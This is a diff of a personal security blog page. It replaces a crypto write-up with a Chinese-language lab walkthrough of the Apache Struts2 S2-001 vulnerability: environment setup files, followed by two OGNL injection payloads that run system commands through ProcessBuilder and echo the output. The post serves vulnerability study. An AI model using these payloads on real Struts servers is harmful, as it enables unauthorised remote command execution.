@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUU-crypto, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="S2-001 漏洞分析, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUU-crypto | V1cuna&#39;s blog</title>
+    <title>S2-001 漏洞分析 | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -286,12 +286,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUU-crypto</h1>
+                    <h1 class="description center-align post-title">S2-001 漏洞分析</h1>
                 </div>
             </div>
         </div>
@@ -408,20 +408,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/WP/">
-                                <span class="chip bg-color">WP</span>
-                            </a>
-                        
-                            <a href="/tags/BUU/">
-                                <span class="chip bg-color">BUU</span>
-                            </a>
-                        
-                            <a href="/tags/crypto/">
-                                <span class="chip bg-color">crypto</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E-java/">
+                                <span class="chip bg-color">-漏洞 -java</span>
                             </a>
                         
                     </div>
@@ -436,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-05
+                    2020-11-14
                 </div>
                 
 
@@ -445,7 +433,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    52
+                    1.5k
                 </div>
                 
 
@@ -462,7 +450,199 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script>
+                <h1 id="s2-001-漏洞分析"><a href="#s2-001-漏洞分析" class="headerlink" title="s2-001 漏洞分析"></a>s2-001 漏洞分析</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>Tomcat Apache（这里我和ttpfx用的是Tomcat 9）</p>
+<p>idea（旗舰）</p>
+<p>struts2.0源码，或者直接白嫖 github 上 vulhub 里 struts2/s2-001/S2-001 压缩包里的 jar 包</p>
+<p>（推荐，比第一种方式快很多）</p>
+<p>前面的自己下载安装（struts2不用安装）</p>
+<h3 id="需要知道的知识"><a href="#需要知道的知识" class="headerlink" title="需要知道的知识"></a>需要知道的知识</h3><h4 id="什么是struts2"><a href="#什么是struts2" class="headerlink" title="什么是struts2"></a>什么是struts2</h4><p><code>struts</code>是由<code>Apache基金会</code>赞助的顶级开源项目，它是一个由<code>JSP</code>和<code>MVC</code>模式实现的大型<code>Web</code>框架</p>
+<h3 id="idea环境搭建"><a href="#idea环境搭建" class="headerlink" title="idea环境搭建"></a>idea环境搭建</h3><h4 id="需要的条件"><a href="#需要的条件" class="headerlink" title="需要的条件"></a>需要的条件</h4><ul>
+<li>Tomcat Apache</li>
+<li>idea（旗舰）</li>
+<li>struts2.0源码，或者直接白嫖<code>github</code>上<code>vulhub</code>里<code>struts2/s2-001/S2-001.war</code>压缩包（是的，这是压缩包的后缀，可以用一般解压软件打开）里的<code>jar</code>包（推荐，比第一种方式快很多）</li>
+</ul>
+<p>前面的自己下载安装（struts2不用安装）</p>
+<h4 id="idea搭建struts"><a href="#idea搭建struts" class="headerlink" title="idea搭建struts"></a>idea搭建struts</h4><h5 id="项目初始文件"><a href="#项目初始文件" class="headerlink" title="项目初始文件"></a>项目初始文件</h5><p>点击<code>File-&gt;new-&gt;project</code>新建项目，然后选择如下</p>
+<blockquote>
+<p> 图源先知社区</p>
+</blockquote>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180831124350-7462942a-acd8-1.png" alt="img" style="zoom:80%;">
+
+
+
+
+
+<p>选择<code>JavaEnterprise</code>里的<code>java</code>即可       </p>
+<blockquote>
+<p>具体原因可以看看这篇文章  <a href="https://blog.csdn.net/qq_45738810/article/details/107842532" target="_blank" rel="noopener">传送门</a></p>
+</blockquote>
+<img src="https://i.loli.net/2020/11/15/sWikJaLFpGl1bXx.png" alt="配置1.png" style="zoom:80%;">
+
+
+
+<p>然后就如上面传送门所说，右键点击左上的项目名，然后点击<code>Add Framework Support</code></p>
+<img src="https://i.loli.net/2020/11/15/seGLzKjdQwiygZc.png" alt="配置2.png" style="zoom:80%;">
+
+
+
+<p>选择<code>Web Application</code></p>
+<p><img src="https://xiaoyngtuo.oss-cn-chengdu.aliyuncs.com/img/%E9%85%8D%E7%BD%AE3.png" alt="配置3"></p>
+<p>然后处理一下初始项目的文件，除了<code>pom.xml</code>、<code>demo.iml</code>和<code>.idea</code>，其他的都可以删了</p>
+<p>贴一下最终配好的目录，等会儿只需要在对应地方（文件夹内部操作就行）加文件就完事了</p>
+<p><strong>index.jsp</strong></p>
+<pre><code class="jsp">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%&gt;
+&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;title&gt;S2-001&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;S2-001 Demo&lt;/h2&gt;
+&lt;p&gt;link: &lt;a href="https://struts.apache.org/docs/s2-001.html"&gt;https://struts.apache.org/docs/s2-001.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;s:form action="login"&gt;
+    &lt;s:textfield name="username" label="username" /&gt;
+    &lt;s:textfield name="password" label="password" /&gt;
+    &lt;s:submit&gt;&lt;/s:submit&gt;
+&lt;/s:form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><strong>welcome.jsp</strong></p>
+<pre><code class="jsp">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%&gt;
+&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;title&gt;S2-001&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><strong>structs.xml</strong></p>
+<pre><code class="xml">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+&lt;!DOCTYPE struts PUBLIC
+    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
+    "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;
+
+&lt;struts&gt;
+
+    &lt;!-- &lt;constant name="struts.enable.DynamicMethodInvocation" value="true" /&gt; --&gt;
+    &lt;constant name="struts.devMode" value="false" /&gt;
+
+
+    &lt;!-- Add packages here --&gt;
+    &lt;package name="S2-001" extends="struts-default"&gt;
+        &lt;action name="login" class="com.demo.action.LoginAction"&gt;
+            &lt;result name="success"&gt;/welcome.jsp&lt;/result&gt;
+            &lt;result name="error"&gt;/index.jsp&lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;
+&lt;/struts&gt;</code></pre>
+<p><strong>web.xml</strong></p>
+<pre><code class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1"&gt;
+
+    &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;
+
+    &lt;filter&gt;
+        &lt;filter-name&gt;struts2&lt;/filter-name&gt;
+        &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;
+    &lt;/filter&gt;
+
+    &lt;filter-mapping&gt;
+        &lt;filter-name&gt;struts2&lt;/filter-name&gt;
+        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+    &lt;/filter-mapping&gt;
+
+    &lt;welcome-file-list&gt;
+        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;
+    &lt;/welcome-file-list&gt;
+
+&lt;/web-app&gt;</code></pre>
+<p>新建<code>package</code>目录<code>com.demo.action</code>，在下面放文件<code>LoginAction.java</code></p>
+<pre><code class="java">package com.demo.action;
+
+import com.opensymphony.xwork2.ActionSupport;
+
+public class LoginAction extends ActionSupport {
+    private String username = null;
+    private String password = null;
+
+    public LoginAction() {
+    }
+
+    public String getUsername() {
+        return this.username;
+    }
+
+    public String getPassword() {
+        return this.password;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String execute() throws Exception {
+        if (!this.username.isEmpty() &amp;&amp; !this.password.isEmpty()) {
+            return this.username.equalsIgnoreCase("admin") &amp;&amp; this.password.equals("admin") ? "success" : "error";
+        } else {
+            return "error";
+        }
+    }
+}</code></pre>
+<p>最后在<code>lib</code>目录下放入必要的<code>jar</code>包</p>
+<h5 id="配置idea"><a href="#配置idea" class="headerlink" title="配置idea"></a>配置idea</h5><p>导入<code>jar</code>包</p>
+<p>点击<code>File-&gt;Project Structure-&gt;Modules</code>（文件-&gt;项目结构-&gt;模块），点击右边<code>+</code>号添加导入的<code>jar</code>包或存放<code>jar</code>包文件夹的路径，最后勾选即可</p>
+<p>我这里导入的是存放<code>jar</code>包的文件夹路径</p>
+<p><img src="https://xiaoyngtuo.oss-cn-chengdu.aliyuncs.com/img/%E9%85%8D%E7%BD%AE4.png" alt="配置4"></p>
+<p>最后需要配置一下<code>Tomcat</code></p>
+<p>点右上角<code>Add Configuration</code>，再点左上角<code>+</code>号，选择<code>Tomcat Server/Local</code></p>
+<p>点击会自动寻找你的<code>Tomcat</code>路径（根目录）</p>
+<p><img src="https://xiaoyngtuo.oss-cn-chengdu.aliyuncs.com/img/%E9%85%8D%E7%BD%AE5.png" alt="配置5"></p>
+<p>下面的<code>URL</code>记得设置成你<code>Tomcat</code>的端口就行(默认是<code>8080</code>，而我的<code>8080</code>被用来监听了<code>burpsuite</code>，所以我的<code>Tomcat</code>设置的是<code>1234</code>，故这里的<code>URL</code>端口也要设置成<code>1234</code>)</p>
+<p>然后点击<code>Deployment</code>，再点右边<code>+</code>号的<code>External Source</code>来选择自己项目的路径，然后选择自己映射到服务器上的目录</p>
+<p>如下就选择映射到<code>web</code>根目录，就是项目的所在目录</p>
+<p><img src="https://xiaoyngtuo.oss-cn-chengdu.aliyuncs.com/img/%E9%85%8D%E7%BD%AE6.png" alt="配置6"></p>
+<p>最后点击右上角<code>Build Project</code>，再点击<code>Run</code>，访问<code>localhost:1234</code>即可</p>
+<p><strong>补充：</strong>不知道会不会有人出现这个问题，我Run时会报SSL的错，但是ttpfx搭建的时候并没有出现。</p>
+<p>其实Tomcat原本就有关于SSL的设置，在/conf/server.xml这里，有一部分被注释了，如图：</p>
+<p><img src="https://i.loli.net/2020/11/15/brHTA53l4EwNVKu.png" alt="server_xml.png"></p>
+<p>将<code>connector</code>标签部分取消注释即可</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先放一下<code>payload</code>吧</p>
+<p>单个命令</p>
+<pre><code>%{
+#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}</code></pre><p>带参数的命令需要在<code>{}</code>中以<code>,</code>分开命令和参数</p>
+<pre><code>%{
+#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"curl","127.0.0.1:1234"})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -505,7 +685,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.hackyangtuo.top/posts/7f16.html">https://www.hackyangtuo.top/posts/7f16.html</a>
+                    <a href="https://www.hackyangtuo.top/posts/38c8.html">https://www.hackyangtuo.top/posts/38c8.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -543,20 +723,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/WP/">
-                                    <span class="chip bg-color">WP</span>
-                                </a>
-                            
-                                <a href="/tags/BUU/">
-                                    <span class="chip bg-color">BUU</span>
-                                </a>
-                            
-                                <a href="/tags/crypto/">
-                                    <span class="chip bg-color">crypto</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E-java/">
+                                    <span class="chip bg-color">-漏洞 -java</span>
                                 </a>
                             
                         </div>
@@ -602,6 +770,61 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/posts/9381.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="安洵杯2020 工作小记">
+                        
+                        <span class="card-title">安洵杯2020 工作小记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Author：ttpfx,V1cuna,
+开幕式活动准备需要做的
+申请教室
+提前一个周要进行复杂的一系列签字
+就这次而言我们要跑保卫处，
+
+
+
+
+出现的问题
+并没有提前调试设备。（国际会议厅设备不熟悉也是一个原因，看来下次最好还是借楼下的会
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            V1cuna
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E8%BF%90%E7%BB%B4-%E6%9D%82/">
+                        <span class="chip bg-color">-运维 -杂</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/posts/6108.html">
                     <div class="card-image">
                         
@@ -618,9 +841,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -636,44 +859,6 @@
                         <span class="chip bg-color">-java</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/271d.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="Laravel 5.8.x 漏洞分析">
-                        
-                        <span class="card-title">Laravel 5.8.x 漏洞分析</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Laravel 5.8.x 漏洞分析据中哥说①环境出了点问题②有五条链子，但是我今天自己只跟出来三条（一条好像被修了）。。。wtcl，没分析出来的我把连接放上。
-搭建环境composer create-project --prefer-di
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-02
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            V1cuna
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
